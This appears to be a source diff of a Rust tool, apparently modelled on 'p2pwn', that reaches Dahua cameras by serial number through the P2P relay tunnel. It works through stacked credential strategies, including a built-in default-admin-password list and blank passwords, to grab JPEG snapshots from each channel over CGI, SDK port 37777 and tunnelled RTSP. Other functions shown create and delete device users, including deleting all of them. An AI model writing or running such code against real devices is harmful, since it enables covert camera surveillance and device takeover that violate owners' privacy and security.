+    // HTTP over PTCP, following p2pwn: every request gets a freshly bound realm
+    // (tunnel.go:1226). The device tears the connection down when it answers 401,
+    // so a retry sent on the same realm is never answered — that is why the
+    // reference re-binds per attempt instead of reusing the challenge channel.
+    // Port 80 comes first because the reference binds a fixed 127.0.0.1:80 and
+    // never consults the device; the port reported by InetWeb is the next
+    // candidate.
+    let mut bind_ports: Vec<u16> = vec![80];
+    for p in [http_port, 8080, 8000, 5000] {
+        if !bind_ports.contains(&p) {
+            bind_ports.push(p);
+        }
+    }
+    if args.verbose {
+        eprintln!("[debug] snapshot HTTP bind ports: {:?}", bind_ports);
+    }
+
+    // Probe each candidate port once and keep only the live ones. Without this
+    // the dead ports are re-tried for every path and every credential strategy
+    // of every channel, each retry burning a full timeout.
+    if bind_ports.len() > 1 {
+        // Any real CGI path proves liveness; channel 1 is the cheapest to spell.
+        let probe_path = "/cgi-bin/snapshot.cgi?action=snapshot&channel=1".to_string();
+        let mut live: Vec<u16> = Vec::new();
+        for &p in &bind_ports {
+            let outcome = probe_bind_port(
                 sock,
                 pcp_session,
-                chal.realm_id,
-                &host,
-                &path,
+                p,
+                &probe_path,
+                "127.0.0.1",
                 probe_timeout,
-                &args.user,
-                &args.password,
             )
             .await;
-            if r.is_some() {
-                body = r;
+            if args.verbose {
+                eprintln!("  [debug] port {} probe: {:?}", p, outcome);
+            }
+            if outcome == PortProbe::Alive {
+                live.push(p);
+            }
+        }
+        // Never narrow to nothing: a device that ignores the plain GET may still
+        // answer the authenticated retry, so keep the previous list as fallback.
+        if !live.is_empty() {
+            if args.verbose {
+                eprintln!(
+                    "  [debug] bind ports narrowed {:?} → {:?}",
+                    bind_ports, live
+                );
+            }
+            bind_ports = live;
+        } else if args.verbose {
+            eprintln!("  [debug] no port answered the probe, keeping all candidates");
+        }
+    }
+
+    let mut captured = 0usize;
+    let mut consecutive_failures = 0usize;
+
+    for ch in &channels {
+        let mut body: Option<Vec<u8>> = None;
+        // Last HTTP status line the device actually answered with, so a failed
+        // channel reports "401 Unauthorized" instead of claiming no response.
+        let mut last_status: Option<String> = None;
+
+        // Build candidate (label, query_user, query_pass) tuples.
+        let mut strategies: Vec<(&str, String, String)> = Vec::new();
+        if !session_str.is_empty() {
+            strategies.push(("session", String::new(), String::new()));
+        }
+        if !args.admin_pass.is_empty() {
+            strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
+        }
+        if !args.password.is_empty() {
+            strategies.push(("camera", args.user.clone(), args.password.clone()));
+        }
+        if args.try_defaults {
+            let admin_user = if args.admin_user.is_empty() {
+                "admin".to_string()
+            } else {
+                args.admin_user.clone()
+            };
+            for pw in DEFAULT_ADMIN_PASSWORDS {
+                if args.admin_pass == *pw {
+                    continue;
+                }
+                strategies.push(("admin-default", admin_user.clone(), (*pw).to_string()));
+            }
+            // last resort: empty admin password (installer-configured devices)
+            if args.admin_pass.is_empty() {
+                strategies.push(("admin-empty", admin_user.clone(), String::new()));
+            }
+        }
+
+        // CGI paths, mirroring `PTCPTunnel.Snapshot` (tunnel.go:1471):
+        // `action=snapshot` first, then the bare CGI, then the jpeg.cgi alias.
+        //
+        // The last two ask for a thumbnail explicitly. A camera that defaults to
+        // full resolution answers `Content-Length: 587243` (`7C03FF7PAZ93E44`),
+        // and a payload that large does not survive the PTCP relay — we read a
+        // few KB of it and then time out with no EOI, so the image is discarded
+        // as truncated. Cameras that already default to a thumbnail (352x288,
+        // ~7 KB) are served by the first three variants as before.
+        let path_variants: Vec<String> = vec![
+            format!("/cgi-bin/snapshot.cgi?action=snapshot&channel={}", ch),
+            "/cgi-bin/snapshot.cgi".to_string(),
+            format!("/cgi-bin/jpeg.cgi?channel={}", ch),
+            format!(
+                "/cgi-bin/snapshot.cgi?action=snapshot&channel={}&width=352&height=288",
+                ch
+            ),
+            format!("/cgi-bin/snapshot.cgi?channel={}&width=352&height=288", ch),
+        ];
+        // Some firmwares ignore the Authorization header and only read
+        // credentials from the query string.
+        let with_creds = |variant: &str, user: &str, pass: &str| -> String {
+            if user.is_empty() {
+                variant.to_string()
+            } else if variant.contains('?') {
+                format!("{}&user={}&password={}", variant, user, pass)
+            } else {
+                format!("{}?user={}&password={}", variant, user, pass)
+            }
+        };
+
+        // === PTCP HTTP GET (fresh realm per request, challenge-driven auth) ===
+        for (label, ref_quser, ref_qpass) in &strategies {
+            for variant in &path_variants {
+                // The clean path comes first: some firmware validates the Digest
+                // over the URI *without* any `user=`/`password=` it never asked
+                // for, so a response computed over the credential-bearing URI is
+                // rejected with 401 on every variant (7H0623FPAZ6CAFA, realm
+                // "Login to <hex>" from a session). p2pwn's Snapshot sends CGI
+                // URIs without query credentials and authenticates only through
+                // the Authorization header. The credential form is kept for the
+                // firmware that only reads the query string.
+                let clean = variant.clone();
+                let with_q = with_creds(variant, ref_quser, ref_qpass);
+                let requests: Vec<String> = if clean == with_q {
+                    vec![clean]
+                } else {
+                    vec![clean, with_q]
+                };
+                for path in requests {
+                    for &port in &bind_ports {
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] ch{} trying {} port={} path={}",
+                                ch, label, port, path
+                            );
+                        }
+                        let host = format!("127.0.0.1:{}", port);
+                        let r = http_get_tunnel(
+                            sock,
+                            pcp_session,
+                            port,
+                            &host,
+                            &path,
+                            probe_timeout,
+                            ref_quser,
+                            ref_qpass,
+                            &session_str,
+                        )
+                        .await;
+                        if let Some((ref_h, ref_b)) = r {
+                            if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
+                                body = Some(jpeg);
+                                if args.verbose {
+                                    eprintln!("  [debug] ch{} OK: {} port={}", ch, label, port);
+                                }
+                                break;
+                            } else {
+                                last_status = Some(
+                                    ref_h
+                                        .lines()
+                                        .find(|l| l.starts_with("HTTP/"))
+                                        .unwrap_or("HTTP (no status line)")
+                                        .trim()
+                                        .to_string(),
+                                );
+                                dump_unusable_snapshot(serial, *ch, label, port, &ref_h, &ref_b);
+                                if args.verbose {
+                                    // Full header block, not just the status line:
+                                    // a truncated snapshot is only diagnosable by
+                                    // comparing Content-Length against what arrived
+                                    // (`7C03FF7PAZ93E44` sent 200 OK with a valid
+                                    // SOI but 2203 bytes and no EOI).
+                                    eprintln!(
+                                        "  [debug] ch{} {} port={} → {} ({} bytes)\n{}",
+                                        ch,
+                                        label,
+                                        port,
+                                        last_status.as_deref().unwrap_or(""),
+                                        ref_b.len(),
+                                        ref_h
+                                            .lines()
+                                            .map(|l| format!("      | {}", l.trim_end()))
+                                            .collect::<Vec<_>>()
+                                            .join("\n")
+                                    );
+                                }
+                            }
+                        }
+                    }
+                }
+                if body.is_some() {
+                    break;
+                }
+            }
+            if body.is_some() {
                 break;
             }
-            if LAST_CALL_DISC.load(Ordering::Relaxed) {
-                break;
+        }
+
+        // === POST form (raw) ===
+        if body.is_none() {
+            let cookie = if session_str.is_empty() {
+                String::new()
+            } else {
+                format!(
+                    "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
+                    session_str, session_str
+                )
+            };
+            for (label, ref_quser, ref_qpass) in &strategies {
+                if ref_quser.is_empty() {
+                    continue;
+                }
+                let post_body = format!("channel={}", ch);
+                let http_request = format!(
+                    "POST /cgi-bin/snapshot.cgi HTTP/1.1\r\n\
+                     Host: 127.0.0.1\r\n\
+                     Accept: image/jpeg,image/webp,image/*,*/*\r\n\
+                     Content-Type: application/x-www-form-urlencoded\r\n\
+                     Connection: close\r\n\
+                     User-Agent: Mozilla/5.0\r\n\
+                     Authorization: Basic {}\r\n\
+                     {cookie}\
+                     Content-Length: {}\r\n\
+                     \r\n\
+                     {}",
+                    base64_encode_basic(&format!("{}:{}", ref_quser, ref_qpass)),
+                    post_body.len(),
+                    post_body
+                );
+                for &port in &bind_ports {
+                    if let Some((ref_h, ref_b)) =
+                        http_exchange_once(sock, pcp_session, port, &http_request, probe_timeout)
+                            .await
+                    {
+                        if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
+                            body = Some(jpeg);
+                            if args.verbose {
+                                eprintln!(
+                                    "  [debug] ch{} OK: {} POST form port={}",
+                                    ch, label, port
+                                );
+                            }
+                            break;
+                        }
+                    }
+                }
+                if body.is_some() {
+                    break;
+                }
+            }
+        }
+
+        // === SDK 37777 through the PTCP tunnel (never direct to public IP) ===
+        if body.is_none() {
+            // Free the DHIP channel before binding the SDK port: on devices that
+            // accept a single PTCP channel at a time the still-open channel would
+            // block the 37777 bind. Done once — later channels go straight to the
+            // SDK without re-reading the socket.
+            if !dhip_freed {
+                if let Some(c) = chal.as_ref() {
+                    if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} freeing DHIP realm={} before SDK bind",
+                            ch, c.realm_id
+                        );
+                    }
+                    ptcp_disconnect(sock, pcp_session, c.realm_id).await;
+                }
+                dhip_freed = true;
+            }
+            let mut creds: Vec<(String, String, String)> = Vec::new();
+            for (label, quser, qpass) in [
+                (String::new(), args.user.clone(), args.password.clone()),
+                (
+                    String::new(),
+                    args.admin_user.clone(),
+                    args.admin_pass.clone(),
+                ),
+            ] {
+                if !quser.is_empty() && !qpass.is_empty() {
+                    creds.push((label, quser, qpass));
+                }
+            }
+            if args.try_defaults {
+                for pw in DEFAULT_ADMIN_PASSWORDS {
+                    if args.admin_user.is_empty() || args.admin_pass == *pw {
+                        continue;
+                    }
+                    creds.push((
+                        format!("sdk-default"),
+                        args.admin_user.clone(),
+                        (*pw).to_string(),
+                    ));
+                }
+            }
+            // last resort: empty password (devices set up by installers that
+            // never configured a password accept the SDK login blank)
+            if args.password.is_empty() && args.admin_pass.is_empty() {
+                creds.push((String::new(), "admin".to_string(), String::new()));
+            }
+            for (label, quser, qpass) in creds {
+                let tag = if label.is_empty() {
+                    "sdk".to_string()
+                } else {
+                    label
+                };
+                if args.verbose {
+                    eprintln!("  [debug] ch{} trying {} (SDK 37777 via tunnel)", ch, tag);
+                }
+                let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
+                let jpeg = client.get_snapshot(sock, pcp_session, *ch as usize).await;
+                if let Some(jpeg_data) = jpeg {
+                    if args.verbose {
+                        eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, tag);
+                    }
+                    body = Some(jpeg_data);
+                    break;
+                } else if args.verbose {
+                    eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, tag);
+                }
+            }
+            if body.is_none() && args.verbose {
+                eprintln!("  [debug] ch{} all SDK snapshot attempts failed", ch);
+            }
+        }
+
+        // === RTSP over the PTCP tunnel (port forward) ===
+        // p2pwn's `ForwardToLocal` (forward.go): bind a fresh realm to the
+        // device RTSP port, relay a local TCP connection over it and run the
+        // existing RTSP/MJPEG client against 127.0.0.1 — so RTSP works even on
+        // devices whose media port is not exposed to the public IP (NAT). Works
+        // without a DHIP session too, like the SDK branch above.
+        if body.is_none() {
+            let mut rtsp_ports: Vec<u16> = vec![rtsp_port];
+            for &p in &[554u16, 854] {
+                if !rtsp_ports.contains(&p) {
+                    rtsp_ports.push(p);
+                }
+            }
+            'rtsp_tunnel: for (label, ruser, rpass) in [
+                (
+                    "rtsp-tunnel-admin",
+                    args.admin_user.clone(),
+                    args.admin_pass.clone(),
+                ),
+                (
+                    "rtsp-tunnel-camera",
+                    args.user.clone(),
+                    args.password.clone(),
+                ),
+            ] {
+                if ruser.is_empty() && rpass.is_empty() {
+                    continue;
+                }
+                for &rport in &rtsp_ports {
+                    if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} {} RTSP-over-tunnel port {} ch={}",
+                            ch, label, rport, ch
+                        );
+                    }
+                    let Some(realm) =
+                        ptcp_bind_retry(sock, pcp_session, rport, probe_timeout, args.verbose)
+                            .await
+                    else {
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] ch{} {} RTSP port {} bind failed",
+                                ch, label, rport
+                            );
+                        }
+                        continue;
+                    };
+                    let listener = match TcpListener::bind("127.0.0.1:0").await {
+                        Ok(l) => l,
+                        Err(e) => {
+                            if args.verbose {
+                                eprintln!("  [debug] ch{} local RTSP listener failed: {}", ch, e);
+                            }
+                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                            continue;
+                        }
+                    };
+                    let Ok(local_addr) = listener.local_addr() else {
+                        let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                        continue;
+                    };
+                    let local_port = local_addr.port();
+                    if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} {} relay 127.0.0.1:{} -> device:{}",
+                            ch, label, local_port, rport
+                        );
+                    }
+                    let client_user = ruser.clone();
+                    let client_pass = rpass.clone();
+                    let ch_num = *ch as u16;
+                    let client = tokio::spawn(async move {
+                        dahua_dhip_adduser::rtsp::capture_snapshot(
+                            "127.0.0.1",
+                            local_port,
+                            ch_num,
+                            &client_user,
+                            &client_pass,
+                            probe_timeout,
+                        )
+                        .await
+                    });
+                    let accepted = tokio::time::timeout(probe_timeout, listener.accept()).await;
+                    let jpeg = match accepted {
+                        Ok(Ok((stream, _))) => {
+                            rtsp_forward_realm(sock, pcp_session, realm, stream, probe_timeout)
+                                .await;
+                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                            client.await.unwrap_or(None)
+                        }
+                        _ => {
+                            if args.verbose {
+                                eprintln!(
+                                    "  [debug] ch{} {} RTSP relay: no local client connected",
+                                    ch, label
+                                );
+                            }
+                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                            client.await.unwrap_or(None)
+                        }
+                    };
+                    if let Some(jp) = jpeg {
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] ch{} OK: {} RTSP-over-tunnel port {}",
+                                ch, label, rport
+                            );
+                        }
+                        body = Some(jp);
+                        break 'rtsp_tunnel;
+                    } else if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} {} RTSP-over-tunnel port {} failed",
+                            ch, label, rport
+                        );
+                    }
+                }
+            }
+            if body.is_none() && args.verbose {
+                eprintln!("  [debug] ch{} all RTSP-over-tunnel attempts failed", ch);
+            }
+        }
+
+        // === Direct TCP HTTP (no PTCP tunnel) ===
+        if body.is_none() && args.direct_http && !device_ip.is_empty() {
+            let mut ports_to_try = vec![http_port];
+            for &p in &[80u16, 8080, 8000, 88] {
+                if p != http_port && !ports_to_try.contains(&p) {
+                    ports_to_try.push(p);
+                }
+            }
+            'direct_loop: for &direct_port in &ports_to_try {
+                for (label, ref_quser, ref_qpass) in &[
+                    (
+                        "direct-admin",
+                        args.admin_user.clone(),
+                        args.admin_pass.clone(),
+                    ),
+                    ("direct-camera", args.user.clone(), args.password.clone()),
+                ] {
+                    for variant in &path_variants {
+                        let path = if ref_quser.is_empty() {
+                            variant.clone()
+                        } else {
+                            format!("{}&user={}&password={}", variant, ref_quser, ref_qpass)
+                        };
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] ch{} trying direct HTTP {}:{} {}",
+                                ch, device_ip, direct_port, label
+                            );
+                        }
+                        let r = http_get_direct(
+                            &device_ip,
+                            direct_port,
+                            &path,
+                            ref_quser,
+                            ref_qpass,
+                            probe_timeout,
+                        )
+                        .await;
+                        if let Some((ref_h, ref_b)) = r {
+                            let is_jpeg = ref_b.len() >= 3
+                                && ref_b[0] == 0xFF
+                                && ref_b[1] == 0xD8
+                                && ref_b[2] == 0xFF;
+                            if is_jpeg {
+                                body = Some(ref_b.clone());
+                                if args.verbose {
+                                    eprintln!(
+                                        "  [debug] ch{} OK: {} direct to {}:{} path={}",
+                                        ch, label, device_ip, direct_port, variant
+                                    );
+                                }
+                                break 'direct_loop;
+                            } else if args.verbose {
+                                let preview: String =
+                                    ref_b.iter().take(80).map(|&b| b as char).collect();
+                                let status = ref_h.lines().next().unwrap_or("");
+                                eprintln!(
+                                    "  [debug] ch{} {} direct to {}:{} → {} ({} bytes): {}",
+                                    ch,
+                                    label,
+                                    device_ip,
+                                    direct_port,
+                                    status,
+                                    ref_b.len(),
+                                    preview
+                                );
+                            }
+                        }
+                    }
+                }
+            }
+            if body.is_none() && args.verbose {
+                eprintln!(
+                    "  [debug] ch{} all direct HTTP attempts to {} failed",
+                    ch, device_ip
+                );
+            }
+        }
+
+        // === RTSP fallback (TCP to device IP, ports 554/854) ===
+        if body.is_none() && args.rtsp && !device_ip.is_empty() {
+            for (label, ref_quser, ref_qpass) in &[
+                (
+                    "rtsp-admin",
+                    args.admin_user.clone(),
+                    args.admin_pass.clone(),
+                ),
+                ("rtsp-camera", args.user.clone(), args.password.clone()),
+            ] {
+                if !ref_quser.is_empty() || !ref_qpass.is_empty() {
+                    let jpeg = dahua_dhip_adduser::rtsp::capture_snapshot(
+                        &device_ip,
+                        rtsp_port,
+                        *ch as u16,
+                        ref_quser,
+                        ref_qpass,
+                        probe_timeout,
+                    )
+                    .await;
+                    if let Some(jpeg_data) = jpeg {
+                        if args.verbose {
+                            eprintln!(
+                                "  [debug] ch{} OK: {} RTSP to {} ch={}",
+                                ch, label, device_ip, ch
+                            );
+                        }
+                        body = Some(jpeg_data);
+                        break;
+                    } else if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} {} RTSP to {} ch={} failed",
+                            ch, label, device_ip, ch
+                        );
+                    }
+                }
+            }
+            if body.is_none() && args.verbose {
+                eprintln!(
+                    "  [debug] ch{} all RTSP attempts to {} failed",
+                    ch, device_ip
+                );
             }
         }
 
         match body {
-            Some((headers, bytes)) => {
-                let status_line = headers.lines().next().unwrap_or("").to_string();
-                let is_jpeg =
-                    bytes.len() >= 3 && bytes[0] == 0xFF && bytes[1] == 0xD8 && bytes[2] == 0xFF;
-                if is_jpeg {
-                    let fname = format!("snapshots/{0}_ch{1}.jpg", serial, ch);
+            Some(bytes) => {
+                // SOI *and* EOI must be present: a truncated image is not a
+                // snapshot, and accepting one silently hides the real failure.
+                if is_valid_jpeg(&bytes) {
+                    consecutive_failures = 0;
+                    let fname = format!("{0}/{1}_ch{2}.jpg", out_dir, serial, ch);
                     std::fs::write(&fname, &bytes)
                         .map_err(|e| format!("cannot write {}: {}", fname, e))?;
                     println!("  [+] ch{} → {} ({} bytes)", ch, fname, bytes.len());
                     captured += 1;
                 } else {
-                    // not a JPEG — probably an error body (auth failure, etc.)
-                    let preview: String = bytes.iter().take(120).map(|&b| b as char).collect();
+                    consecutive_failures += 1;
                     println!(
-                        "  [-] ch{} → not a JPEG ({}) body: {}",
-                        ch, status_line, preview
+                        "  [-] ch{} → incomplete JPEG ({} bytes, EOI {}), discarded",
+                        ch,
+                        bytes.len(),
+                        if bytes.ends_with(&[0xFF, 0xD9]) {
+                            "present"
+                        } else {
+                            "missing"
+                        }
                     );
                 }
             }
             None => {
-                println!(
-                    "  [-] ch{} → no response via snapshot CGI (channel may not expose it / needs RTSP)",
-                    ch
-                );
+                consecutive_failures += 1;
+                match &last_status {
+                    // A 401/403 is a real answer: the CGI exists but our auth was
+                    // rejected. Saying "no response" sent us hunting for a dead
+                    // channel instead of a missing password.
+                    Some(st) if st.contains("401") || st.contains("403") => {
+                        println!(
+                            "  [-] ch{} → {} from snapshot CGI: auth rejected, retry with -u/-w or --admin-pass (or --try-defaults)",
+                            ch, st
+                        );
+                    }
+                    Some(st) => {
+                        println!(
+                            "  [-] ch{} → {} from snapshot CGI: reachable but no JPEG in the response body",
+                            ch, st
+                        );
+                    }
+                    None => {
+                        println!(
+                            "  [-] ch{} → no response via snapshot CGI (channel may not expose it / needs RTSP)",
+                            ch
+                        );
+                    }
+                }
             }
         }
     }
 
-    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
-        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
-        probe_timeout).await;
-    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
+    if probing && consecutive_failures == channels.len() {
+        println!(
+            "  [!] all {} probed channel(s) failed (device may have no cameras or the snapshot CGI is unavailable)",
+            consecutive_failures
+        );
+    }
+
+    if !dhip_freed {
+        if let Some(c) = chal.as_ref() {
+            ptcp_disconnect(sock, pcp_session, c.realm_id).await;
+        }
+    }
 
     if captured == 0 {
         Err(format!("no snapshot captured for {}", serial))
@@ -3025,6 +4106,145 @@ fn collect_channel_ids(params: &serde_json::Value) -> Vec<u32> {
     out.sort_unstable();
     out.dedup();
     out
+}
+
+/// Query the device for its HTTP/RTSP ports over a live, logged-in DHIP session:
+/// `InetWeb` first, then the `Network` table for older firmware that has no
+/// InetWeb section. Shared by the snapshot flow and the HTTP add-user fallback.
+async fn query_network_ports(
+    sock: &UdpSocket,
+    pcp_session: &Mutex<PTCPSession>,
+    dhip: &Mutex<DhipSession>,
+    session_id: u32,
+    probe_timeout: Duration,
+    verbose: bool,
+) -> NetworkPorts {
+    let mut ports = NetworkPorts {
+        http: None,
+        rtsp: None,
+    };
+
+    let req = json!({"id": 450, "magic": "0x1234", "method": "configManager.getConfig",
+        "params": {"name": "InetWeb"}, "session": session_id});
+    match dhip_call(sock, pcp_session, dhip, &req.to_string(), probe_timeout).await {
+        Some(resp) => match serde_json::from_str::<Value>(&resp) {
+            Ok(v) => {
+                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
+                    match v.get("params") {
+                        Some(params) => {
+                            ports = extract_network_ports(params);
+                            if verbose {
+                                eprintln!(
+                                    "[debug] device InetWeb: HTTP port={:?}, RTSP port={:?}",
+                                    ports.http, ports.rtsp
+                                );
+                            }
+                        }
+                        None if verbose => {
+                            eprintln!("[debug] device InetWeb: result=true but no params");
+                        }
+                        _ => {}
+                    }
+                } else if verbose {
+                    let err = v.get("error").map(|e| e.to_string()).unwrap_or_default();
+                    eprintln!("[debug] device InetWeb: result=false {}", err);
+                }
+            }
+            Err(_) if verbose => {
+                let preview: String = resp.chars().take(200).collect();
+                eprintln!("[debug] device InetWeb: parse error: {}", preview);
+            }
+            Err(_) => {}
+        },
+        None if verbose => {
+            eprintln!("[debug] device InetWeb: no response (timeout)");
+        }
+        None => {}
+    }
+
+    // Also try "Network" table for older firmware that doesn't have InetWeb
+    // (or reported the plain 80 default, matching the historical behaviour).
+    if ports.http.is_none() || ports.http == Some(80) {
+        let req2 = json!({"id": 451, "magic": "0x1234", "method": "configManager.getConfig",
+            "params": {"name": "Network"}, "session": session_id});
+        if let Some(resp) =
+            dhip_call(sock, pcp_session, dhip, &req2.to_string(), probe_timeout).await
+        {
+            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
+                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
+                    if let Some(params) = v.get("params") {
+                        let net = extract_network_ports(params);
+                        if let Some(p) = net.http {
+                            ports.http = Some(p);
+                            if verbose {
+                                eprintln!("[debug] device Network: HTTP port={}", p);
+                            }
+                        }
+                        if ports.rtsp.is_none() {
+                            ports.rtsp = net.rtsp;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    ports
+}
+
+struct NetworkPorts {
+    http: Option<u16>,
+    rtsp: Option<u16>,
+}
+
+/// Extract HTTP/RTSP ports from an InetWeb config object.
+/// InetWeb can be a single object `{HttpPort: 80, RtspPort: 554, ...}` or
+/// an array of such objects.
+fn extract_network_ports(params: &serde_json::Value) -> NetworkPorts {
+    let mut result = NetworkPorts {
+        http: None,
+        rtsp: None,
+    };
+    fn walk(v: &serde_json::Value, out: &mut NetworkPorts) {
+        match v {
+            serde_json::Value::Object(map) => {
+                for (k, val) in map {
+                    let lk = k.to_lowercase();
+                    if (lk == "httpport" || lk == "port" || lk == "webport" || lk == "http_port")
+                        && out.http.is_none()
+                    {
+                        if let Some(n) = val.as_u64() {
+                            out.http = Some(n as u16);
+                        } else if let Some(s) = val.as_str() {
+                            if let Ok(n) = s.trim().parse::<u16>() {
+                                out.http = Some(n);
+                            }
+                        }
+                    }
+                    if (lk == "rtspport" || lk == "rtsp_port" || lk == "mediaport")
+                        && out.rtsp.is_none()
+                    {
+                        if let Some(n) = val.as_u64() {
+                            out.rtsp = Some(n as u16);
+                        } else if let Some(s) = val.as_str() {
+                            if let Ok(n) = s.trim().parse::<u16>() {
+                                out.rtsp = Some(n);
+                            }
+                        }
+                    }
+                    walk(val, out);
+                }
+            }
+            serde_json::Value::Array(arr) => {
+                for item in arr {
+                    walk(item, out);
+                }
+            }
+            _ => {}
+        }
+    }
+    walk(params, &mut result);
+    result
 }
 
 /// Extract flat `key=value` pairs from a getConfig params object that look P2P/
@@ -3177,13 +4397,13 @@ async fn http_establish_session(
     port: u16,
     args: &Args,
 ) -> Result<(u32, String), String> {
-    let bind_timeout = Duration::from_secs(15);
+    let bind_timeout = args.timeout_or(15);
     let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
         .await
         .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;
 
     let host = format!("127.0.0.1:{}", port);
-    let timeout = Duration::from_secs(15);
+    let timeout = args.timeout_or(15);
 
     let login1 = json!({
         "method": "global.login",
@@ -3376,7 +4596,7 @@ async fn http_try_delete_user(
     }
     let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
     let host = format!("127.0.0.1:{}", port);
-    let timeout = Duration::from_secs(15);
+    let timeout = args.timeout_or(15);
     let result = http_delete_user(
         sock,
         pcp_session,
@@ -3404,7 +4624,7 @@ async fn http_delete_user(
     user_name: Option<String>,
     args: &Args,
 ) -> Result<(), String> {
-    let timeout = Duration::from_secs(15);
+    let timeout = args.timeout_or(15);
 
     // Resolve user object via getUserInfoAll (by Id or by Name).
     // La tupla (Option<Value>, bool): il bool = lista utenti letta con successo (usato
@@ -3605,7 +4825,7 @@ async fn http_try_delete_all(
     }
     let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
     let host = format!("127.0.0.1:{}", port);
-    let timeout = Duration::from_secs(15);
+    let timeout = args.timeout_or(15);
     let result = http_delete_all_users(sock, pcp_session, realm_id, &host, &session, args).await;
     let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
     ptcp_disconnect(sock, pcp_session, realm_id).await;
@@ -3621,7 +4841,7 @@ async fn http_delete_all_users(
     session: &str,
     args: &Args,
 ) -> Result<(), String> {
-    let timeout = Duration::from_secs(15);
+    let timeout = args.timeout_or(15);
 
     // List all users.
     let body = json!({
@@ -3934,4 +5154,34 @@ fn xml_escape_cli(s: &str) -> String {
         .replace('<', "&lt;")
         .replace('>', "&gt;")
         .replace('"', "&quot;")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn snapshot_folder_is_named_after_the_input_file() {
+        assert_eq!(
+            snapshot_output_dir(Some("serial_20_08.txt")),
+            "snapshot - serial_20_08"
+        );
+        assert_eq!(
+            snapshot_output_dir(Some("/tmp/cams ok.xml")),
+            "snapshot - cams ok"
+        );
+        assert_eq!(
+            snapshot_output_dir(Some("dir.with.dots/file.name.serials.csv")),
+            "snapshot - file.name.serials"
+        );
+    }
+
+    #[test]
+    fn snapshot_folder_falls_back_to_plain_name() {
+        // Single-serial runs have no input file to name the folder after.
+        assert_eq!(snapshot_output_dir(None), "snapshots");
+        // Dotfiles and trailing slashes have no usable stem.
+        assert_eq!(snapshot_output_dir(Some(".")), "snapshots");
+        assert_eq!(snapshot_output_dir(Some("   ")), "snapshots");
+    }
 }
